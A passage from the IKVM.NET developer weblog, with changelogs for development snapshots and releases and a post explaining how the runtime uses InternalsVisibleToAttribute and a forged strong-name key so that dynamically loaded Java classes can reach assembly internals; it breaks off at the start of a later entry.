	<h3 class="entryTitle">IKDASM Update</h3>
	<div class="entryBody">
		<P>I finally created a github repository for <A href="https://github.com/jfrijters/ikdasm">ikdasm</A>. A couple of weeks ago I fixed some ildasm compatibility issues and changed pinvokeimpl and marshalas handling to use the IKVM.Reflection specific APIs instead of decoding the pseudo custom attributes (I also used the new IKVM.Reflection feature to disable generating pseudo custom attributes). I added external module support and fixed some other small issues.</P>
<P>The primary purpose of ikdasm is to make sure that the IKVM.Reflection API is complete. I believe it now exposes all relevant Managed PE file features. The secondary feature is to test IKVM.Reflection and to make this easy ikdasm replicates (almost) all ildasm quirks to enable comparing the output files. I disassembled a large number of files (including C++/CLI and Managed C++ files) and compared the results.</P>
<P>Only a small subset of ildasm functionality has been cloned. There is no GUI and most command line options are also not implemented.</P>
<P>Pull requests are welcome.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/25/2013 11:58:14 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a4cc186b-1934-4e96-8571-8f81f3771e4e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a4cc186b-1934-4e96-8571-8f81f3771e4e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a2d8a8a68-5ad0-4dbf-a318-5981d2ab65db"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Still more changes to better support what I'll start calling "mixed mode" (i.e. ikvmc compiled assemblies that use dynamically loaded classes or use dynamic binding to classes in another assembly).</P>
<P>Another change is that runtime stub class generation is now based on the ikvmstub class file writer, instead of the very old code that was reflection based. This means that stubs can now acurately be generated even when some of the types involved are not available.</P>
<P>Changes:</P>
<UL>
<LI>Refactored assembly class loading.</LI>
<LI>Added ikvm.runtime.EnumerationWrapper to expose an IEnumerable as a java.util.Enumeration.</LI>
<LI>Removed the old runtime Java stub class generator and replaced it with the ikvmstub core.</LI>
<LI>Allow dynamic class loading from boot class "path" and referenced assemblies.</LI>
<LI>Regression fix. The previous custom assembly class loader construction rewrite introduced a bug.</LI>
<LI>Bug fix. MethodHandle should be able to call dynamic only methods.</LI>
<LI>Bug fix. MethodHandle to Object.clone/finalize should be special cased.</LI>
<LI>Reimplemented dynamic binding on top of MethodHandles.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4804.zip">ikvmbin-7.3.4804.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/25/2013 07:41:17 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2d8a8a68-5ad0-4dbf-a318-5981d2ab65db"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2d8a8a68-5ad0-4dbf-a318-5981d2ab65db">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 20 February 2013</h2></div>
<div class="newsItems"><a name="a192a187a-89cb-4af7-9c7c-4b865f85198c"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>A quick update&nbsp;because the previous snapshot had a bug that caused ikvmc to be completely broken on the CLR x86 JIT.</P>
<P>Changes:</P>
<UL>
<LI>Changed build to explicitly exclude the classes that are already defined in map.xml.</LI>
<LI>Changed ikvmc to add uncompilable classes loaded from the file system to classes.jar.</LI>
<LI>Changed ikvmc to copy zip file comment.</LI>
<LI>Changed ikvmc to emit a warning if a remapped type duplicates a loaded class.</LI>
<LI>Removed CallerID optimization special casing since we can now call internal members from dynamic assemblies.</LI>
<LI>Added some version information to the Internal Compiler Error message.</LI>
<LI>Added some version information to runtime critical failure.</LI>
<LI>Fixed AttributeHelper to have a deterministic class constructor.</LI>
<LI>Bug fix. Disallow invalid class names in AssemblyClassLoader.loadClass().</LI>
<LI>Removed the special casing of generic type definition loading as we've since exposed the generic type definitions to Java.</LI>
<LI>Some beginnings of class loading refactoring.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4799.zip">ikvmbin-7.3.4799.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/20/2013 08:24:44 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=192a187a-89cb-4af7-9c7c-4b865f85198c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=192a187a-89cb-4af7-9c7c-4b865f85198c">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 18 February 2013</h2></div>
<div class="newsItems"><a name="abca1a209-0bbf-4a09-a14d-87a4f0ce1788"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Lot's of changes in just a week. The most interesting one being that ikvmc and the runtime now work together to project all the classes that were in the original jars compiled by ikvmc are now visible in the same (virtual) jars at runtime.</P>
<P>To avoid making the generated assemblies much bigger, this is implemented by having ikvmc generate a compressed file called --ikvm-classes--/ in the resources jar that contains the names of the classes compiled from this jar. This typically adds about 0.5% size overhead. At runtime when that jar is read in by java.util.zip.ZipFile it expands the list of class names to create virtual ZipEntries. Only when a virtual&nbsp;class resource is accessed is the class stub generated.</P>
<P>Changes:</P>
<UL>
<LI>Fixed ikvmc to give a proper error message if it fails to write to the output file.</LI>
<LI>If a class can't be statically compiled due to a missing base class/interface, include it as a resource.</LI>
<LI>Modified the assembly class loader to try to load classes from resources.</LI>
<LI>Made dynamic binding to unloadable types the default (for ikvmc).</LI>
<LI>Added -static option to ikvmc to disable dynamic binding.</LI>
<LI>Unified all ikvmc filename validation.</LI>
<LI>Implemented StandardGlyphVector.getGlyphOutline().</LI>
<LI>Bug fix. When looking for a method to override we should handle internal access methods.</LI>
<LI>Fixed some runtime memory model issues (for non-x86 architectures).</LI>
<LI>Bug fix. Custom attribute annotation should skip indexer properties.</LI>
<LI>Bug fix. The available() method of the InputStream returned by ZipFile.getInputStream() was based on ZipEntry passed in, instead of the actual one.</LI>
<LI>Fixed ikvmc to suppress "class not found" warning for a classes that fails to compile for any reason (because we've already given a warning about it).</LI>
<LI>Bug fix. Don't look for main method in excluded classes.</LI>
<LI>Unified the handling of resources and classes in ikvmc.</LI>
<LI>Include all uncompilable .class files (from jars) into the resource jars.</LI>
<LI>Project stub classes into the jar the classes originated from.</LI>
<LI>Fixed ikvmc to prefer the last jar entry if there are duplicate entries. This mirrors the behavior of Java and dynamic mode.</LI>
<LI>Fixed ikvmc to compare extensions case sensitive to find .class files.</LI>
<LI>Fixed ikvmc to use the jar entry name, instead of the class name to load classes.</LI>
<LI>Removed exclude.lst left over from ancient times.</LI>
<LI>Removed META-INF/mailcap.default and META-INF/mimetypes.default resources that are no longer in resources.jar.</LI>
<LI>Changed ikvmc -recurse: option to give a fatal error if it matches no files.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4796.zip">ikvmbin-7.3.4796.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/18/2013 09:05:07 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bca1a209-0bbf-4a09-a14d-87a4f0ce1788"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bca1a209-0bbf-4a09-a14d-87a4f0ce1788">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 11 February 2013</h2></div>
<div class="newsItems"><a name="a85333138-19c8-41a4-bc9c-f53a7030eea6"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>The <A HREF="/PermaLink.aspx?guid=42729fb3-af19-4249-a9c1-88f1a82874e3">recent architectural change</A> makes it possible for the static compiler to use dynamic binding when it encounters a missing type. This in turn makes the dynamic binding support more important, so I've been fixing a lot of bugs in this area.</P>
<P>Currently, ikvmc will still emit code that statically throws a NoClassDefFoundError when accessing missing types, but in the future the default will change to generate dynamic binding code in this case.</P>
<P>Changes:</P>
<UL>
<LI>Fixed a bug with Graphics.setComposite(x). This fixes most paint artefacts of Nimbus L&amp;F.</LI>
<LI>Fixed a NPE in constructor of BufferedImage.</LI>
<LI>Fixed TexturePaint bugs.</LI>
<LI>Enable ldc <METHODTYPE>to work for unloadable types in dynamic mode.</LI>
<LI>Changed dynamic bytecode helper methods to be CallerID based instead of trusting the caller to provide the right context type handle.</LI>
<LI>Use sun.launcher.LauncherHelper to make the launcher more consistent with Java.</LI>
<LI>Implemented package access checks in dynamic mode.</LI>
<LI>Fixed reflection handling of unloadable types.</LI>
<LI>Added CodeGenOptions.DisableDynamicBinding to disable dynamic binding, instead of conditional compilation.</LI>
<LI>Bug fix. Dynamic method invocations should unwrap InvocationTargetException.</LI>
<LI>Bug fix. Dynamic instantiation should throw InstantiationError when trying to instantiate an abstract class.</LI>
<LI>Bug fix. Dynamic invokespecial (that isn't a new) should fail verification.</LI>
<LI>Bug fix. Dynamic method lookup should also look in base classes (for non-constructor methods).</LI>
<LI>Bug fix. When dynamically calling a non-constructor instance method, the receiver object should be of the correct type.</LI>
<LI>Added support for setPaint with custom Paint implementation.</LI>
<LI>Added support for dynamic (non-loadable type) annotations in statically compiled code.</LI>
<LI>Have ikvmc record inner classes even if they can't be loaded.</LI>
<LI>Have ikvmc record the outer class even if it is not loadable.</LI>
<LI>Bug fix. If the runtime tries to load a class from an assembly with a custom assembly class loader, the custom assembly class loader should be called. Previously it would only be called if the Java class loader had been instantiated.</LI>
<LI>Bug fix. We should emit miranda methods for non-abstract classes too.</LI>
<LI>Bug fix. Mark "missing" interface methods so that subclasses (that are compiled separately) know that the base class is incomplete.</LI>
<LI>Allow dynamic assemblies injected into assembly class loaders to be (debug dump) saved.</LI>
<LI>Changed the build system to automatically scan all sources files for copyright statements and validate that all GPL licensed files include the Classpath exception.</LI>
<LI>Removed resource compiler dependency from JVM.DLL build.</LI>
<LI>Bug fix. Custom assembly class loader was made visible to other threads while it was still being constructed.</LI>
<LI>Stop considering ACC_SUPER when linking invokespecial (unless compatibility switch is set). This change matches the security change in Java 7u13.</LI>
<LI>Improved ldc MethodType: Use nested type with class constructor to create values with statically know signatures (like ldc MethodHandle).</LI>
<LI>Improved ldc MethodType: Use caching for dynamicallly constructed MethodType values but retry on failure.</LI>
<LI>Fixed dynamic dispatch class loading exception handling to wrap non-java.lang.Error exceptions in NoClassDefFoundError.</LI>
<LI>Added support for dynamic ldc MethodHandle.</LI>
<LI>Added support for dynamically linking the boostrap method of an invokedynamic.</LI>
<LI>IKVM.Reflection: Expose the Name and __ModuleHash for missing external Modules.</LI>
<LI>IKVM.Reflection: Regression fix. The AssemblyNames returned by Module.__GetReferencedAssemblies() didn't have the ContentType set for windowruntime assembly references.</LI>
<LI>IKVM.Reflection: Added new public API Module.__ResolveTypeSpecCustomModifiers() to resolve the (useless) custom modifiers that can be put on TypeSpecs.</LI>
<LI>IKVM.Reflection: Added another overload of the public API Module.__GetSectionInfo() that returns more information about the section.</LI>
<LI>IKVM.Reflection: Bug fix. The OriginalFilename in the version info resource should only include the filename, not the path.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4790.zip">ikvmbin-7.3.4790.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/11/2013 13:02:04 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=85333138-19c8-41a4-bc9c-f53a7030eea6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=85333138-19c8-41a4-bc9c-f53a7030eea6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 25 January 2013</h2></div>
<div class="newsItems"><a name="a42729fb3-af19-4249-a9c1-88f1a82874e3"></a><div class="entry">
	<h3 class="entryTitle">Fixing a Long Standing Limitation</h3>
	<div class="entryBody">
		<P>I finally fixed the limitation that classes dynamically loaded by an assembly class loader can't access the internals of the assembly.</P>
<P>Here's a simple demonstration of the problem. Suppose you have these two classes:</P>
<P><CODE>class Other {<BR>&nbsp; static {<BR>&nbsp;&nbsp;&nbsp; Test.m();<BR>&nbsp; }<BR>}<BR><BR>class Test {<BR>&nbsp; public static void main(String[] args) throws Exception {<BR>&nbsp;&nbsp;&nbsp; Class.forName("Other");<BR>&nbsp; }<BR>&nbsp; static void m() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("Test.m");<BR>&nbsp; }<BR>}</CODE></P>
<P>Now if you compile Test.class (without Other) into an assembly with a ClassPathAssemblyClassLoader and run this with IKVM.NET 7.2 you'll see something like this:</P>
<DIV style="BACKGROUND: black; COLOR: #f0f0f0"><CODE><BR>C:\j&gt;ikvmc Test.class -classloader:ikvm.runtime.ClassPathAssemblyClassLoader<BR>IKVM.NET Compiler version 7.2.4630.6<BR>Copyright (C) 2002-2013 Jeroen Frijters<BR>http://www.ikvm.net/<BR><BR>note IKVMC0001: Found main method in class "Test"<BR>note IKVMC0002: Output file is "Test.exe"<BR><BR>C:\j&gt;Test<BR>Exception in thread "main" java.lang.ExceptionInInitializerError<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at cli.System.Runtime.CompilerServices.RuntimeHelpers._RunClassConstructor(Unknown Source)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at IKVM.Internal.TypeWrapper.RunClassInit(Unknown Source)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at IKVM.NativeCode.java.lang.Class.forName0(Unknown Source)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at java.lang.Class.forName(Class.java:287)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at Test.main(Test.java:9)<BR>Caused by: cli.System.MethodAccessException: Test.m()<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at Other.&lt;clinit&gt;(Test.java)<BR></CODE></DIV>
<P>The call from Other to Test fails with a <CODE><A href="http://msdn.microsoft.com/en-us/library/system.methodaccessexception.aspx">MethodAccessException</A></CODE>, because the dynamic assembly does not have access to the internal members of the Test.exe assembly.</P>
<P>Long ago I considered fixing this by adding an <CODE><A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.internalsvisibletoattribute.aspx">InternalsVisibleToAttribute</A></CODE> to all statically compiled assemblies that allows the runtime generated dynamic assembly access to its internals, but I dismissed this because it would mean that untrusted code could abuse this same assembly identity to access the internals of any ikvmc compiled assemblies.</P>
<P><STRONG>Forging a StrongNameKeyPair</STRONG></P>
<P>Yesterday I realized that I could use InternalsVisibleToAttribute without opening a security hole. When the IKVM runtime is running as fully trusted code, it can forge a StrongNameKeyPair to attach to the dynamic assemblies it generates and thereby gain access to the statically compiled assemblies, without giving untrusted code the same access.</P>
<P>The only downside to this approach is that it relies on an implementation detail of the CLR (and Mono). I try to stay away from depending on implementation details, but in this case the gain far outways any risk.</P>
<P><STRONG>Using It From C#</STRONG></P>
<P>It also works&nbsp;for your C# assemblies. By adding a custom attribute, you can now enable dynamically loaded Java classes access to your assembly internals.</P>
<P>Here's a C# example:</P><CODE><SPAN style="COLOR: blue">using</SPAN> System;<BR><SPAN style="COLOR: blue">using</SPAN> System.Runtime.CompilerServices;<BR><SPAN style="COLOR: blue">using</SPAN> java.lang;<BR><SPAN style="COLOR: blue">using</SPAN> java.lang.reflect;<BR><BR>[<SPAN style="COLOR: blue">assembly</SPAN>: <SPAN style="COLOR: #2b91af">InternalsVisibleTo</SPAN>(<SPAN style="COLOR: #a31515">"DemoApp-ikvm-runtime-injected, PublicKey=00240000048000009400000006020000002400005253413100040000010001009D674F3D63B8D7A4C428BD7388341B025C71AA61C6224CD53A12C21330A3159D300051FE2EED154FE30D70673A079E4529D0FD78113DCA771DA8B0C1EF2F77B73651D55645B0A4294F0AF9BF7078432E13D0F46F951D712C2FCF02EB15552C0FE7817FC0AED58E0984F86661BF64D882F29B619899DD264041E7D4992548EB9E"</SPAN>)]<BR><BR><SPAN style="COLOR: blue">interface</SPAN> <SPAN style="COLOR: #2b91af">IFoo</SPAN> {<BR>&nbsp; <SPAN style="COLOR: #2b91af">Program</SPAN> Instance { <SPAN style="COLOR: blue">get</SPAN>; }<BR>}<BR><BR><SPAN style="COLOR: blue">class</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN> : <SPAN style="COLOR: #2b91af">InvocationHandler</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">static</SPAN> <SPAN style="COLOR: blue">void</SPAN> Main() {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Class</SPAN> c = <SPAN style="COLOR: blue">typeof</SPAN>(<SPAN style="COLOR: #2b91af">Program</SPAN>);<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var</SPAN> cl = c.getClassLoader();<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var</SPAN> interfaces = <SPAN style="COLOR: blue">new</SPAN> <SPAN style="COLOR: #2b91af">Class</SPAN>[] { <SPAN style="COLOR: blue">typeof</SPAN>(<SPAN style="COLOR: #2b91af">IFoo</SPAN>) };<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var</SPAN>&nbsp;handler =&nbsp;<SPAN style="COLOR: blue">new</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN>();<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var</SPAN> proxy = (<SPAN style="COLOR: #2b91af">IFoo</SPAN>)<SPAN style="COLOR: #2b91af">Proxy</SPAN>.newProxyInstance(cl, interfaces, handler);<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(proxy.Instance);<BR>&nbsp; }<BR>&nbsp; <SPAN style="COLOR: blue">public</SPAN> <SPAN style="COLOR: blue">object</SPAN> invoke(<SPAN style="COLOR: blue">object</SPAN> obj, <SPAN style="COLOR: #2b91af">Method</SPAN> m, <SPAN style="COLOR: blue">object</SPAN>[] objarr) {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">return</SPAN> <SPAN style="COLOR: blue">this</SPAN>;<BR>&nbsp; }<BR>}</CODE> 
<P>Here we create a Proxy for the non-public interface IFoo. This is allowed because of the InternalsVisibleToAttribute that gives access to an assembly named DemoApp-ikvm-runtime-injected with the specified public key. The name of the assembly must be the name of the current assembly (in this example "DemoApp") with "-ikvm-runtime-injected" appended. The public key is always the same. The corresponding private key does not exist.</P>
<P><STRONG>Development Snapshot</STRONG></P>
<P>Please note that this is a development snapshot, not a release or release candidate. So consider it untested.</P>
<P>Changes:</P>
<UL>
<LI>Use InternalsVisibleToAttribute to allow the runtime to dynamically inject classes into statically compiled assemblies. 
<LI>Stop generating proxy helpers for non-public interfaces. 
<LI>Added support for RadialGradientPaint in Graphics.setPaint().</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4772.zip">ikvmbin-7.3.4772.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/25/2013 07:51:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=42729fb3-af19-4249-a9c1-88f1a82874e3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=42729fb3-af19-4249-a9c1-88f1a82874e3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 16 January 2013</h2></div>
<div class="newsItems"><a name="af44d069c-eb46-42f8-874f-f391d8dbce86"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>The recent <A href="http://surfsec.wordpress.com/2013/01/06/circumventing-windows-rts-code-integrity-mechanism/">Windows RT jailbreak</A> enabled me to run&nbsp;IKVM on my Surface RT. Out of curiousity I decided to run a part of the test suite. Only&nbsp;three tests failed, one because it relies on specific GC behavior and two because they use JVM.DLL. Previously, IKVM's JVM.DLL assemblies were created with ilasm, because that was the easiest way to create unmanaged exports at the time. However, ilasm doesn't seem to support ARM, so I added this support to IKVM.Reflection and wrote a simple <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/tools/implib.cs?view=markup">tool</A> to generate unmanaged export assemblies. Of course, supporting unmanaged exports on Windows RT in IKVM.Reflection is not very useful, but it was an interesting exercise to learn a little bit about the ARM instruction set.</P>
<P>I also did some more useful work. I finally got around to changing how ikvmc handles assembly references. It now works like the C# compiler and uses the IKVM.Reflection support for missing assemblies that I added for mcs. This means that it no longer automatically loads assemblies (apart from the IKVM runtime and class library assemblies) and you need to add explicit references for indirectly used assemblies as well. The downside is that this has the potential to break some builds, but the upside is that the compilation process is now more predictable and only loads the actually required assemblies, like a "real" compiler, instead of the System.Reflection heritage that required loading&nbsp;even unused&nbsp;dependencies.</P>
<P>Another change is that ikvmstub jars are now officially deprecated from being used with ikvmc (it will still work for a while, but a warning message is issued).</P>
<P>Finally, it is now illegal to explicitly reference a secondary assembly in a shared class loader group. Previously this caused a warning message, but now&nbsp;this is an error. You need to reference the primary assembly.</P>
<P>Changes:</P>
<UL>
<LI>Deduplicate ikvmc messages based on all parameter values, not just the first one.</LI>
<LI>Allow ikvmc messages to be suppressed based on any number of parameter values.</LI>
<LI>Fixed ikvmc to write fully specific -nowarn options to suppress file.</LI>
<LI>Fixed ikvmc to handle missing types.</LI>
<LI>Added ikvmc support for missing assemblies.</LI>
<LI>Officially deprecated using stubs with ikvmc.</LI>
<LI>Bug fix. Don't add duplicate methods to attribute annotation interfaces. The primary cause of this was attributes with virtual properties where we would add the base class property as well as the derived class overridden property.</LI>
<LI>Changed build process to replace ilasm usage to generate JVM.DLL with a custom tool.</LI>
<LI>Bug fix. Local variable analysis for finally blocks was incorrect. Fixes bug #3600788.</LI>
<LI>Changed ikvmc to give an error message (instead of a warning) when referencing a secondary assembly from a shared class loader group).</LI>
<LI>Made ikvmc EditorBrowsableAttribute construction fully symbolic, to avoid having to load System.dll.</LI>
<LI>Disabled automatic assembly loading for ikvmc.</LI>
<LI>Suppress ikvmc warnings after an error has occurred (to avoid obscuring the fact that compilation failed).</LI>
<LI>IKVM.Reflection: Added UniverseOptions.ResolveMissingMembers and deprecated EnableMissingMemberResolution().</LI>
<LI>IKVM.Reflection: Added Universe.ResolvedMissingMember event.</LI>
<LI>IKVM.Reflection: Fixed importing of CLR types with funny names (where we'd previously run into bugs in CLR's Type.Name and Type.Namespace).</LI>
<LI>IKVM.Reflection: Restructured relocation writing to pack all relocation in a page in the same block, as WoA apparently requires this.</LI>
<LI>IKVM.Reflection: Implemented ARM startup stub.</LI>
<LI>IKVM.Reflection: Implemented ARM unmanaged exports.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4764.zip">ikvmbin-7.3.4764.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/16/2013 12:24:57 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f44d069c-eb46-42f8-874f-f391d8dbce86"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f44d069c-eb46-42f8-874f-f391d8dbce86">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 15 January 2013</h2></div>
<div class="newsItems"><a name="aea47497d-4a34-4b74-91ae-ac06d7fd4670"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Update 1 Release Candidate 0</h3>
	<div class="entryBody">
		<P>An updated release with a couple of bug fixes.</P>
<P>Changes (relative to <A HREF="/PermaLink.aspx?guid=926e3554-259e-49a6-82fc-459fbd61ac19">7.2</A>):</P>
<UL>
<LI>Bug fix. Don't deadlock AppDomain.ProcessExit event handler when the event gets called from another thread than the one initiating exit.</LI>
<LI>Bug fix. Static compiler should not use proxy stubs to implement non-public interfaces in another assembly.</LI>
<LI>Bug fix. Don't add duplicate methods to attribute annotation interfaces.</LI>
<LI>Bug fix. Local variable analysis for finally blocks was incorrect. Fixes bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3600788&amp;group_id=69637">3600788</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.6.zip">ikvmbin-7.2.4630.6.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.6.zip">ikvmsrc-7.2.4630.6.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/15/2013 11:47:09 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ea47497d-4a34-4b74-91ae-ac06d7fd4670"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ea47497d-4a34-4b74-91ae-ac06d7fd4670">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 06 January 2013</h2></div>
<div class="newsItems"><a name="a0422d02e-bd4a-4a06-ab4e-b59f4cca6a26"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've been busy with other stuff, but I did manage to fix a couple of bugs and add a new feature. So a new development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>.NET resources in non-Java assemblies are now exposed as Java resources.</LI>
<LI>Added IKVM.Attributes.JavaResourceAttribute to publish .NET resource to Java under a different name.</LI>
<LI>Bug fix. Don't deadlock AppDomain.ProcessExit event handler when the event gets called from another thread than the one initiating exit.</LI>
<LI>Minor optimization. Only register the AppDomain.ProcessExit event handler when necessary.</LI>
<LI>Bug fix. Private methods declared in map.xml should not be made virtual.</LI>
<LI>Support "attributes" attribute on method tag in map.xml for methods declared in remapped types.</LI>
<LI>Recognize methods in remapped types with the "__&lt;" name prefix as HideFromJava.</LI>
<LI>Bug fix. Static compiler should not use proxy stubs to implement non-public interfaces in another assembly.</LI>
<LI>IKVM.Reflection: Implemented __ContainsMissingType for function pointer types.</LI>
<LI>IKVM.Reflection: Changed __ContainsMissingType to take custom modifiers into account.</LI>
<LI>IKVM.Reflection: Added caching for __ContainsMissingType property to simplify the prevention of infinite recursion while evaluating generic parameter constraints.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4754.zip">ikvmbin-7.3.4754.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/06/2013 09:51:23 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0422d02e-bd4a-4a06-ab4e-b59f4cca6a26"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0422d02e-bd4a-4a06-ab4e-b59f4cca6a26">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 28 December 2012</h2></div>
<div class="newsItems"><a name="a6ae059e4-c328-4de0-9f9d-9def73b42adf"></a><div class="entry">
	<h3 class="entryTitle">Raspberry Pi</h3>
	<div class="entryBody">
		<P>I got a Raspberry Pi for my birthday.</P>
